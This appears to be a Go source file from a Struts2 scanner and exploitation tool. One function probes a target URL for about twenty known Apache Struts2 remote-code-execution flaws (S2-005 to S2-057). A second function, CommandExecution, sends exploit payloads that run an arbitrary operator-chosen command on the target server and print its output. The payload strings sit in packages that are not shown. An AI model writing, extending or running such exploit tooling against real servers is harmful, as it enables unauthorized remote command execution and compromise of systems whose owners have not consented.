package scanner

import (
	vs "Struts2Scanner/VulnerabilityScanner"
	"Struts2Scanner/funcs"
	sce "Struts2Scanner/shellCommandExecution"
	"Struts2Scanner/vars"
	"fmt"
	"os"
)

//普通漏洞检测

func VulnerabilityScanner(url string)  {
	req, err := vs.Ppoc(vars.Poc["ST2_005"], url, vars.Header1)
	if err != nil {
		fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]struts2-005检测失败：", err)
	}
	funcs.VulnerabilityChecking(url, req,"struts2-005")

	req, err = vs.Gpoc(vars.Poc["ST2_008_1"], url, vars.Header1)
	if err != nil {
		fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]struts2-008-1检测失败：", err)
	}
	funcs.VulnerabilityChecking(url, req,"struts2-008-1")

	req, err = vs.Gpoc(vars.Poc["ST2_008_2"], url, vars.Header1)
	if err != nil {
		fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]struts2-008-2检测失败：", err)
	}
	funcs.VulnerabilityChecking(url, req,"struts2-008-2")

	req, err = vs.Ppoc(vars.Poc["ST2_009"], url, vars.Header1)
	if err != nil {
		fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]struts2-009检测失败：", err)
	}
	funcs.VulnerabilityChecking(url, req,"struts2-009")

	req, err = vs.Ppoc(vars.Poc["ST2_013"], url, vars.Header1)
	if err != nil {
		fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]struts2-013检测失败：", err)
	}
	funcs.VulnerabilityChecking(url, req,"struts2-013")

	req, err = vs.Ppoc(vars.Poc["ST2_016"], url, vars.Header1)
	if err != nil {
		fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]struts2-016检测失败：", err)
	}
	funcs.VulnerabilityChecking(url, req,"struts2-016")

	err = vs.Gpoc017(url, vars.Header1)
	if err != nil {
		fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]struts2-017检测失败", err)
	}

	req, err = vs.Ppoc(vars.Poc["ST2_019"], url, vars.Header1)
	if err != nil {
		fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]struts2-019检测失败：", err)
	}
	funcs.VulnerabilityChecking(url, req,"struts2-019")

	req, err = vs.Gpoc(vars.Poc["ST2_devmode"], url, vars.Header1)
	if err != nil {
		fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]struts2-devmode检测失败：", err)
	}
	funcs.VulnerabilityChecking(url, req,"struts2-devmode")

	req, err = vs.Gpoc(vars.Poc["ST2_032"], url, vars.Header1)
	if err != nil {
		fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]struts2-032检测失败：", err)
	}
	funcs.VulnerabilityChecking(url, req,"struts2-032")

	req, err = vs.Gpoc(vars.Poc["ST2_033"], url, vars.Header1)
	if err != nil {
		fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]struts2-033检测失败：", err)
	}
	funcs.VulnerabilityChecking(url, req,"struts2-033")

	req, err = vs.Gpoc(vars.Poc["ST2_037"], url, vars.Header1)
	if err != nil {
		fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]struts2-037检测失败：", err)
	}
	funcs.VulnerabilityChecking(url, req,"struts2-037")

	req, err = vs.Gpoc("", url, vars.Header2)
	if err != nil {
		fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]struts2-045检测失败：", err)
	}
	funcs.VulnerabilityChecking(url, req,"struts2-045")

	err = vs.Gpoc0452(url)
	if err != nil {
		fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]struts2-045-2检测失败：", err)
	}

	req, err = vs.Ppoc046(url,vars.Header1)
	if err != nil {
		fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]struts2-046检测失败：", err)
	}
	funcs.VulnerabilityChecking(url, req,"struts2-046")

	req, err = vs.Ppoc048(url, vars.Header1)
	if err != nil {
		fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]struts2-048检测失败：", err)
	}
	funcs.VulnerabilityChecking(url, req, "struts2-048")

	err = vs.Ppoc020(url, vars.Header1)
	if err != nil {
		fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]struts2-020检测失败：", err)
	}

	err = vs.Ppoc052(url, vars.Header3)
	if err != nil {
		fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]struts2-052检测失败：", err)
	}

	err = vs.Gpoc053(url, vars.Header1)
	if err != nil {
		fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]struts2-053检测失败：", err)
	}

	err = vs.Gpoc057(url, vars.Header1)
	if err != nil {
		fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]检测struts2-057-2检测失败：", err)
	}
}

func CommandExecution(url, poc, cmd string)  {
	switch {
	case poc == "struts2-005":
		req, err := sce.Pexp(url, vars.Shell["struts2-005"], cmd, vars.Header1)
		if err != nil {
			fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]"+cmd+"命令执行失败",err)
			return
		}
		fmt.Println(req)

	case poc == "struts2-008-1":
		req, err := sce.Gexp(url, vars.Shell["struts2-008-1"], cmd, vars.Header1)
		if err != nil {
			fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]"+cmd+"命令执行失败",err)
			return
		}
		fmt.Println(req)

	case poc == "struts2-008-2":
		req, err := sce.Gexp(url, vars.Shell["struts2-008-2"], cmd, vars.Header1)
		if err != nil {
			fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]"+cmd+"命令执行失败",err)
			return
		}
		fmt.Println(req)

	case poc == "struts2-009":
		req, err := sce.Pexp(url, vars.Shell["struts2-009"], cmd, vars.Header1)
		if err != nil {
			fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]"+cmd+"命令执行失败",err)
			return
		}
		fmt.Println(req)

	case poc == "struts2-013":
		req, err := sce.Pexp(url, vars.Shell["struts2-013"], cmd, vars.Header1)
		if err != nil {
			fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]"+cmd+"命令执行失败",err)
			return
		}
		fmt.Println(req)

	case poc == "struts2-016":
		req, err := sce.Pexp(url, vars.Shell["struts2-016"], cmd, vars.Header1)
		if err != nil {
			fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]"+cmd+"命令执行失败",err)
			return
		}
		fmt.Println(req)

	case poc == "struts2-019":
		req, err := sce.Pexp(url, vars.Shell["struts2-019"], cmd, vars.Header1)
		if err != nil {
			fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]"+cmd+"命令执行失败",err)
			return
		}
		fmt.Println(req)

	case poc == "struts2-devmode":
		req, err := sce.Gexp(url, vars.Shell["struts2-devmode"], cmd, vars.Header1)
		if err != nil {
			fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]"+cmd+"命令执行失败",err)
			return
		}
		fmt.Println(req)

	case poc == "struts2-032":
		req, err := sce.Gexp(url, vars.Shell["struts2-032"], cmd, vars.Header1)
		if err != nil {
			fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]"+cmd+"命令执行失败",err)
			return
		}
		fmt.Println(req)

	case poc == "struts2-033":
		req, err := sce.Gexp(url, vars.Shell["struts2-033"], cmd, vars.Header1)
		if err != nil {
			fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]"+cmd+"命令执行失败",err)
			return
		}
		fmt.Println(req)

	case poc == "struts2-037":
		req, err := sce.Gexp(url, vars.Shell["struts2-037"], cmd, vars.Header1)
		if err != nil {
			fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]"+cmd+"命令执行失败",err)
			return
		}
		fmt.Println(req)

	case poc == "struts2-045":
		req, err := sce.Gexp045(url, cmd)
		if err != nil {
			fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]"+cmd+"命令执行失败",err)
			return
		}
		fmt.Println(req)

	case poc == "struts2-045-2":
		req, err := sce.Gexp0452(url, cmd)
		if err != nil {
			fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]"+cmd+"命令执行失败",err)
			return
		}
		fmt.Println(req)

	case poc == "struts2-046":
		req, err := sce.Pexp046(url, cmd, vars.Header1)
		if err != nil {
			fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]"+cmd+"命令执行失败",err)
			return
		}
		fmt.Println(req)

	case poc == "struts2-048":
		req, err := sce.Pexp048(url, cmd, vars.Header1)
		if err != nil {
			fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]"+cmd+"命令执行失败",err)
			return
		}
		fmt.Println(req)

	case poc == "struts2-053":
		req, err := sce.Gexp053(url, cmd, vars.Header1)
		if err != nil {
			fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]"+cmd+"命令执行失败",err)
			return
		}
		fmt.Println(req)

	case poc == "struts2-057":
		req, err := sce.Gexp057(url, cmd, "struts2-057-1", vars.Header1)
		if err != nil {
			fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]struts2-057-1"+cmd+"命令执行失败，正在尝试struts2-057-2",err)
			reqs, errs := sce.Gexp057(url, cmd, "struts2-057-2", vars.Header1)
			if errs != nil {
				fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]struts2-057-2"+cmd+"命令执行失败",err)
			}
			fmt.Println(reqs)
			return
		}
		fmt.Println(req)

	default:
		fmt.Printf("\033[1;32m%s\033[0m\n","[-]请输入正确的漏洞名字" + "例如：Struts2Scanner -u " + url + "-n struts2-005")
		os.Exit(0)
	}
}